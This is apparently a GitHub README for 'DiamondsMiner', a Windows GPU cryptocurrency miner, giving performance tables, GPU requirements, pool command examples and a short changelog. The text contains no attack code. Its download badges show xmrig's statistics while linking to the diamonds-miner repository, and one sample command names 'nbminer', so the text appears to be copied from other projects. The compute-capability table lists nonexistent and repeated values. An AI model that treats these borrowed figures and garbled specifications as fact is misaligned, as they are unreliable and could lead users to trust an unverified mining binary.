[![Github All Releases](https://img.shields.io/github/downloads/xmrig/xmrig/total.svg)](https://github.com/diamonds-miner/diamonds/releases)
[![GitHub Release Date](https://img.shields.io/github/release-date/xmrig/xmrig.svg)](https://github.com/diamonds-miner/diamonds/releases)

![Без имени](https://user-images.githubusercontent.com/75134782/100481307-be768280-3104-11eb-8fdc-554fbf0da807.png)

This is first multi-algorithm GPUMiner Diamonds for ETH, BTM, SERO, HNS, BFC [Windows].

DiamondsMiner this is a universal software for mining cryptocurrencies. It supports a lot of algorithms, and as a developer, I try to do my best to make it as fast and easy to use as possible.

## Performance (stock frequency)
| Algorithm        |  Coin   |  P106-100  |  P104-8G   |   1070ti   |  1080ti  |   2080   | RX580 2048sp |
| BFC              |   BFC   |    100     |    160     |    140     |   180    |   220    |      X       |
| HNS              |   HNS   |    170M    |    270M    |    300M    |   455M   |   450M   |     155M     |
| ETH              |   ETH   |   22.5M    |   35.5M    |   27.9M    |   46M    |  35.5M   |     25M      |
| BTM              |   BTM   |   2,950    |   3,300    |   3,400    |  5,000   |  11,500  |      X       |
| HNS+ETH          | HNS+ETH |  86M+20M   |  140M+40M  | 168M+26.2M | 186M+44M | 300M+34M |  78M+22.5M   |
| SERO             |  SERO   |   12.3M    |   18.5M    |   14.3M    |  22.5M   |  35.8M   |     15M      |
| BTM+ETH          | BTM+ETH | 900+15.5M  | 1700+26.5M |  1400+22M  | 2450+40M | 8000+28M |      X       |

## Features

* Mine up to 5 algorithms simultaneously
* Guided setup mode
* Run in background without a window
* Windows: 7/8/10 [64-bit]
* SSL connection to mining pools.

## Requirements

- **NVIDIA Driver version: >= 377**.
- GPU Specific Requirements:
| Algorithm        |  Coins   | Capability | Memory (Win7) | Memory (Win10) |
| BTM              |   BTM   |   7.1, 7.2, 8.6,8.0, 8.6   |          1GB          |      1GB       |
| ETH              |   ETH   | 7.5, 7.3, 8.6, 7.4, 8.0,8.6 |          4GB          |      4GB       |
| BTM-ETH          | BTM+ETH | 7.6, 7.2, 8.5, 8.5 |          4GB          |      4GB       |
| SERO             |  SERO   | 7.3, 7.3, 8.5, 7.6, 8.0,8.6 |          2GB          |      2GB       |
| BFC              |   BFC   | 7.7, 7.3, 8.6, 7.7, 8.0,8.6 |          5GB          |      6GB       |
| HNS              |   HNS   | 7.7, 7.3, 8.6, 7.7, 8.0,8.6 |         0.1GB         |     0.1GB      |
| HNS+ETH          | HNS+ETH | 7.5, 7.3, 8.6, 7.7, 8.0,8.6 |          4GB          |      4GB       |
| beamv3 | BEAM | 7.0, 7.1, 8.0, 7.5 | 3GB | 3GB |
| octopus | CFX | 7.0, 7.1, 8.0, 7.5, 8.0,8.6 | 5GB | 5GB |


- \* Compute Capability reference link: [wikipedia](<https://en.wikipedia.org/wiki/CUDA#GPUs_supported>)

## Sample Usages

#### BTM

- **f2pool:**  -a tensority -o stratum+tcp://btm.f2pool.com:9221 -u bm1xxxxxxxxxx.worker
- **antpool:**  -a tensority -o stratum+tcp://stratum-btm.antpool.com:6666 -u username.worker
- **matpool.io:**  -a tensority -o stratum+tcp://btm.matpool.io:8118 -u bm1xxxxxxxxxxx.worker

#### ETH

- **ethermine:**  -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0x12343bdgf.worker
- **sparkpool:**  -a ethash -o ethproxy+tcp://cn.sparkpool.com:3333 -u 0x12343bdgf.worker
- **f2pool:**  -a ethash -o ethproxy+tcp://eth.f2pool.com:8008 -u 0x12343bdgf.worker
- **beepool:**  -a ethash -o ethproxy+tcp://eth-pool.beepool.org:9530 -u 0x12343bdgf.worker
- **nanopool:**  -a ethash -o ethproxy+tcp://eth-asia1.nanopool.org:9999 -u 0x12343bdgf.worker
- **herominers:** -a ethash -o ethproxy+tcp://ethereum.herominers.com:10201 -u 0x12343bdgf.worker
- **nicehash:** -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u btc_address.worker

#### BTM+ETH

- **f2pool:** -a tensority_ethash -o stratum+tcp://btm.f2pool.com:9221 -u btm_address.btm_worker -do ethproxy+tcp://eth.f2pool.com:8008 -du eth_address.eth_worker


#### SERO

- **beepool**: nbminer -a progpow_sero -o stratum+tcp://sero-pool.beepool.org:9515 -u wallet_address.worker:pswd
- **f2pool**: nbminer -a progpow_sero -o stratum+tcp//sero.f2pool.com:4200 -u wallet_address.worker:pswd


#### BFC

- **uupool**:  -a bfc -o stratum+tcp://bfc.uupool.cn:12210 -u username.worker
- **bfcpool**:  -a bfc -o stratum+tcp://ss.bfcpool.com:3333 -u wallet.worker

#### HNS

- **f2pool**: -a hns -o stratum+tcp://hns.f2pool.com:6000 -u wallet.worker
- **6block**: -a hns -o stratum+tcp://handshake.6block.com:7701 -u username.worker

#### HNS+ETH:

- **f2pool**: -a hns_ethash -o stratum+tcp://hns.f2pool.com:6000 -u wallet.worker -do stratum+tcp://eth.f2pool.com:8008 -du wallet.worker


## Change Log

#### v0.1.1
- fixed an error when restarting miner after setting the timer
- fixed a lack of memory for ETH for NVIDIA
- improved performance of the ETH algorithm for NVIDIA
